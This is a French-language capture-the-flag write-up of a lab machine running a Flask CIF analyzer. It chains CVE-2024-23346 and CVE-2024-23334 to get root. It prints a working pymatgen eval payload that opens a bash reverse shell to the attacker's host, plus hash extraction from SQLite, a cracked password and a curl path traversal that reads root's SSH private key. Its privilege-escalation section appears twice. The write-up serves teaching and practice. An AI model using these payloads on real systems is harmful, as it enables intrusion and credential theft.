![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

Ma méthodologie débute par une phase d'énumération classique pour identifier la surface d'attaque. Le scan de ports révèle deux services exposés, dont un serveur web non standard sur le port 5000.

#### 1. Énumération des services

J'utilise **nmap** pour cartographier les ports ouverts et identifier les versions des services.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.38

# Scan détaillé des services identifiés
nmap -p 22,5000 -sCV 10.10.11.38
```

**Résultats clés :**
*   **Port 22/TCP** : **OpenSSH 8.2p1** (Ubuntu).
*   **Port 5000/TCP** : Serveur HTTP utilisant **Werkzeug 3.0.3** et **Python 3.9.5**. Cela indique une application **Flask**.

L'interface web présente un outil nommé **Chemistry CIF Analyzer**, conçu pour traiter des fichiers **Crystallographic Information File (CIF)**. Après avoir créé un compte utilisateur, j'accède à un tableau de bord permettant l'upload de ces fichiers.

> **Schéma Mental :**
> Port 5000 (HTTP) -> Application Flask -> Fonctionnalité d'upload de fichiers CIF -> Traitement côté serveur via une librairie Python spécialisée -> Vecteur potentiel d'**Insecure Deserialization** ou d'injection.

#### 2. Analyse de la stack technique et vulnérabilité

L'application utilise la librairie Python **pymatgen** (Python Materials Genomics) pour parser les fichiers CIF. Une recherche sur les vulnérabilités liées au parsing de fichiers CIF dans cet écosystème pointe vers la **CVE-2024-23346**.

Cette vulnérabilité réside dans le module `pymatgen/symmetry/settings.py`. La fonction de traitement utilise `eval()` de manière non sécurisée sur des chaînes de caractères extraites du fichier CIF, notamment lors de la gestion des transformations de symétrie. Bien que les développeurs aient tenté de restreindre les `__builtins__`, l'utilisation de `eval()` sur une entrée utilisateur non filtrée permet une **Arbitrary Code Execution**.

#### 3. Exploitation de la CVE-2024-23346

Pour valider la vulnérabilité, je prépare un fichier CIF malveillant. Le payload exploite la réflexion Python pour remonter la hiérarchie des classes et atteindre le module `os` afin d'exécuter des commandes système.

**Payload de test (ICMP Exfiltration) :**
Le but est de déclencher un `ping` vers ma machine d'attaque pour confirmer l'exécution.

```python
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 1 10.10.14.6");0,0,0'
```

**Étapes de l'attaque :**
1.  Upload du fichier CIF modifié sur le **Dashboard**.
2.  Déclenchement de l'exécution en cliquant sur "View" pour forcer le parsing du fichier.
3.  Réception du paquet ICMP sur mon interface `tun0`.

#### 4. Obtention du Reverse Shell

Une fois l'exécution confirmée, je remplace le payload par un **Bash Reverse Shell**. Étant donné que l'environnement peut être restreint, j'utilise le chemin absolu `/bin/bash`.

**Fichier CIF malveillant final :**
```text
data_poc
_audit_creation_method "Pymatgen CIF Parser Exploit"
loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P n' m a'"
```

J'écoute sur le port 443 et je visualise le fichier sur l'application :

```bash
# Sur ma machine d'attaque
nc -lnvp 443

# Stabilisation du shell après connexion
script /dev/null -c /bin/bash
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je récupère un accès initial en tant qu'utilisateur **app**.

> **Schéma Mental :**
> Upload CIF -> Trigger `CifParser` -> Appel de `eval()` sur le champ `transform_BNS_Pp_abc` -> Évasion du sandbox Python via `__subclasses__` -> Appel de `os.system()` -> **Reverse Shell**.

---

### Énumération Interne & Post-Exploitation

Une fois l'accès initial obtenu en tant qu'utilisateur **app**, j'entame une phase d'énumération locale pour identifier les vecteurs de mouvement latéral. Le système contient deux utilisateurs réels avec un **Bash shell** : `app` et `rosa`.

L'application **Flask** est située dans `/home/app`. L'analyse du fichier `app.py` révèle l'utilisation d'une base de données **SQLite** pour la gestion des utilisateurs.

```bash
# Inspection de la configuration de la base de données
cat app.py | grep SQLALCHEMY_DATABASE_URI
# Sortie : app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'

# Énumération de la base de données avec sqlite3
sqlite3 /home/app/instance/database.db
sqlite> .tables
sqlite> select * from user;
```

La table `user` contient plusieurs entrées. Je relève particulièrement le hash de l'utilisateur **rosa** : `63ed86ee9f624c7b14f1d4f43dc251a5`. L'analyse du code source confirme que l'application utilise l'algorithme **MD5** sans **salt** pour le stockage des mots de passe.

> **Schéma Mental :**
> Accès initial (`app`) -> Extraction de la base SQLite -> Récupération de Hash MD5 -> **Offline Cracking** -> Pivot vers l'utilisateur `rosa`.

### Mouvement Latéral : Pivot vers Rosa

Le hash MD5 de **rosa** est vulnérable aux attaques par dictionnaire. En utilisant **CrackStation** ou **Hashcat**, le mot de passe est rapidement identifié : `unicorniosrosados`.

```bash
# Tentative de pivot via su ou SSH
su - rosa
# Password: unicorniosrosados
```

L'utilisateur **rosa** dispose des privilèges de lecture sur son propre répertoire personnel, me permettant de récupérer le premier flag (`user.txt`).

### Énumération pour l'Escalade de Privilèges (Root)

En inspectant les services réseaux locaux, je remarque un service écoutant sur le port **8080** (localhost uniquement).

```bash
netstat -tnlp
# Local Address: 127.0.0.1:8080
```

Une vérification des processus montre que ce service tourne avec les privilèges **root** et exécute une application Python située dans `/opt/monitoring_site/app.py`. Cependant, une règle **iptables** empêche l'utilisateur `app` (UID 1001) d'accéder à ce port. En tant que **rosa**, cette restriction ne s'applique pas.

Pour analyser l'application confortablement, je mets en place un **SSH Tunneling** (Local Port Forwarding) :

```bash
# Depuis ma machine d'attaque
ssh -L 8888:127.0.0.1:8080 rosa@10.10.11.38
```

### Exploitation de CVE-2024-23334 (AIOHTTP Path Traversal)

L'application sur le port 8080 utilise la bibliothèque **AIOHTTP** version 3.9.1. Cette version spécifique est vulnérable à un **Path Traversal** (CVE-2024-23334) lorsque l'option `follow_symlinks` est activée sur une route statique.

L'application expose un répertoire `/assets/` qui pointe vers le dossier `static/` du serveur.

> **Schéma Mental :**
> Service interne (Root) -> **AIOHTTP 3.9.1** -> Route statique mal configurée -> **Directory Traversal** -> Lecture de fichiers sensibles (`/root/.ssh/id_rsa`).

Je teste la vulnérabilité en tentant de remonter l'arborescence pour lire la clé privée SSH de **root**.

```bash
# Payload de Path Traversal via curl
curl -s http://localhost:8888/assets/../../../../root/.ssh/id_rsa
```

La requête réussit et renvoie la **RSA Private Key**. Il ne reste plus qu'à l'utiliser pour obtenir un shell stable avec les privilèges maximaux.

```bash
# Accès final via SSH
nano root_key # Coller la clé
chmod 600 root_key
ssh -i root_key root@10.10.11.38
```

### Analyse Post-Mortem (Beyond Root)

L'analyse du code source dans `/opt/monitoring_site/app.py` confirme la vulnérabilité. La ligne incriminée est :
`app.router.add_static('/assets/', path='static/', follow_symlinks=True)`

L'activation de `follow_symlinks=True` dans cette version de **AIOHTTP** ne valide pas correctement les séquences `../`, permettant ainsi de sortir du répertoire `static/` et d'accéder à l'intégralité du **File System**.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès initial établi en tant qu'utilisateur **app**, mon objectif est de pivoter vers un compte avec des privilèges plus élevés, puis de compromettre totalement l'hôte.

#### 1. Escalade Horizontale : de app à rosa

L'énumération du système de fichiers révèle que l'application **Flask** utilise une base de données **SQLite** située dans `instance/database.db`. En analysant le code source de `app.py`, je confirme que les mots de passe sont stockés sous forme de hash **MD5** sans sel (salt).

```bash
# Extraction des hashs depuis la base SQLite
sqlite3 instance/database.db "SELECT username, password FROM user;"

# Résultats obtenus
admin:2861debaf8d99436a10ed6f75a252abf
rosa:63ed86ee9f624c7b14f1d4f43dc251a5
```

Le hash de l'utilisatrice **rosa** est rapidement cassé via **CrackStation** ou **Hashcat**, révélant le mot de passe : `unicorniosrosados`. Ce compte dispose d'un accès **SSH** et de privilèges étendus sur ses propres fichiers, me permettant de récupérer le premier flag.

---

#### 2. Escalade Verticale : de rosa à root

L'analyse des connexions réseau locales via `netstat -tnlp` montre un service écoutant exclusivement sur `127.0.0.1:8080`. Bien qu'une règle **IPTables** bloque l'utilisateur **app** (UID 1001), l'utilisateur **rosa** peut y accéder.

> **Schéma Mental : Exploitation de Service Interne via Tunneling**
> 1. **Identification** : Un service **AIOHTTP** tourne en tant que **root** sur le port 8080.
> 2. **Accessibilité** : Création d'un **SSH Tunnel** pour exposer le port local distant sur ma machine d'attaque.
> 3. **Vulnérabilité** : Utilisation d'une faille de **Path Traversal** connue sur cette version spécifique de la bibliothèque.
> 4. **Exfiltration** : Lecture de la clé privée **SSH** de **root** pour une compromission totale.

##### Mise en place du Tunnel SSH
```bash
ssh -L 8888:127.0.0.1:8080 rosa@10.10.11.38
```

##### Exploitation de la CVE-2024-23334 (AIOHTTP Path Traversal)
Le service utilise **AIOHTTP 3.9.1**. Cette version est vulnérable à un **Path Traversal** lorsque l'option `follow_symlinks=True` est activée sur une route statique. En observant les requêtes vers `/assets/`, je tente de sortir du répertoire racine de l'application.

```bash
# Lecture de la clé privée SSH de root via Path Traversal
curl -s --path-as-is "http://localhost:8888/assets/../../../../root/.ssh/id_rsa"
```

La requête réussit et m'affiche la **RSA Private Key**. Je l'enregistre localement, ajuste les permissions avec `chmod 600`, et me connecte en tant que **root**.

```bash
ssh -i root_id_rsa root@10.10.11.38
```

---

#### 3. Analyse Post-Exploitation : Beyond Root

L'examen du code source de l'application de monitoring dans `/opt/monitoring_site/app.py` confirme l'origine de la vulnérabilité. Le développeur a configuré la route statique de manière non sécurisée :

```python
# Extrait du code vulnérable dans /opt/monitoring_site/app.py
app.router.add_static('/assets/', path='static/', follow_symlinks=True)
```

**Analyse technique :**
*   **L'erreur de configuration** : L'argument `follow_symlinks=True` combiné à une validation insuffisante du chemin dans **AIOHTTP < 3.9.2** permet d'utiliser des séquences `../` pour remonter jusqu'à la racine du système de fichiers (`/`).
*   **Privilèges excessifs** : L'application tourne avec les privilèges **root**, ce qui signifie que le **Path Traversal** n'est limité par aucune restriction de permissions système (DAC), permettant la lecture de fichiers sensibles comme `/etc/shadow` ou les clés **SSH**.
*   **Isolation réseau** : La règle **IPTables** limitant l'accès au port 8080 suggère que l'administrateur était conscient du risque potentiel du service, mais a tenté de le sécuriser par l'obscurité et la segmentation plutôt que par une mise à jour logicielle.